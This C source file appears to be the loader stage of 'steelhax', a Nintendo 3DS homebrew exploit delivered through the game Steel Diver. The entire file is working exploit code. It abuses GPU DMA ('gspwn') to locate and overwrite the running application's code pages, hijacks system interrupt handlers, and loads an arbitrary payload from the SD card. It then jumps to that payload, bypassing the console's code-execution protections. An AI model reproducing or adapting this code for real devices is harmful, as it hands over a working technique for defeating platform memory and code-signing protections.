#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <3ds.h>

#include "stuffPresentInSteelDiver.h"
#include "functions.h"
#include "pad.h"

void _main()
{
    u32 otherappPages[0x8];
    memset(otherappPages, 0x0, 0x4+0x8);

    u32 linear_base = 0x14000000 + (*(u8*)APPMEMTYPE == 0x6 ? 0x07c00000 : 0x04000000) - CODEBIN_SIZE;

    for(unsigned int i = 0, l = 0x14000000, pages = 0; i < CODEBIN_SIZE && pages < 0x8; i+=0x1000, l+=0x20)
    {
        gspwn((void*)l, (void*)(linear_base + i), 0x1000);
        svcSleepThread(0x100000);
        
        for(u8 j = 0; j < 0x8; j++)
        {
            if(!_memcmp((void*)l, (void*)(0x101000 + j*0x1000), 0x20))
            {
                otherappPages[j] = i;
                pages++;
            }
        }
    }

    _DSPDSP_UnloadComponent(dspHandle);
    _DSPDSP_RegisterInterruptEvents(dspHandle, 0x0, 0x2, 0x2);
    for(int i = 0; i < 7; i++)
        ((vu32*)(STEEL_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x10))[i] = STEEL_SVC_EXITTHREAD;
    APT_FinalizeClientThread();
    svcSleepThread(10000000);

    Handle file;
    Result ret = 0x00;
    ret = _FSUSER_OpenFileDirectly(fsHandle, &file, 0, 0x00000009, PATH_EMPTY, "", 1, PATH_ASCII, "/steelhax/payload.bin", strlen("/steelhax/payload.bin")+1, FS_OPEN_READ, 0);

    if(!ret)
    {
        u64 payload_size = 0;
        _FSFILE_GetSize(file, &payload_size);

        u32 btx = 0;
        _FSFILE_Read(file, &btx, 0, (u32*)LINEAR_BUFFER, payload_size);
        payload_size = (payload_size+0xFFF) & ~0xFFF;
        svcSleepThread(0x100000);
        _FSFILE_Close(file);
        _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)LINEAR_BUFFER, payload_size);
        svcSleepThread(0x100000);
        //padWait();
        for(int i = 0; i < 0x8; i++)
        {
            gspwn((void*)(linear_base + otherappPages[i]), (void*)(LINEAR_BUFFER+i*0x1000), 0x1000);
            svcSleepThread(0x100000);
        }


        // ghetto dcache invalidation
        // don't judge me
        int i, j;
            for(j=0; j<0x4; j++)
                for(i=0; i<0x01000000/0x4; i+=0x4)
                    LINEAR_BUFFER[i+j]^=0xDEADBABE;
        
        // run payload
        {
            void (*payload)(u32* paramlk, u32* stack_pointer) = (void*)0x00101000;
            u32* paramblk = (u32*)LINEAR_BUFFER;
    
            paramblk[0x1c >> 2] = STEEL_GSPGPU_GXCMD4;
            paramblk[0x20 >> 2] = STEEL_GSPGPU_FLUSHDATACACHE_WRAPPER;
            paramblk[0x48 >> 2] = 0x8d; // flags
            paramblk[0x58 >> 2] = STEEL_GSPGPU_HANDLE;
            paramblk[0x64 >> 2] = 0x08010000;
            
            //svcSleepThread(250000000);
            payload(paramblk, (u32*)(0x10000000 - 4));
        }
    }
    else
    {
        _svcBreak(0xDEAD10AD);
    }
}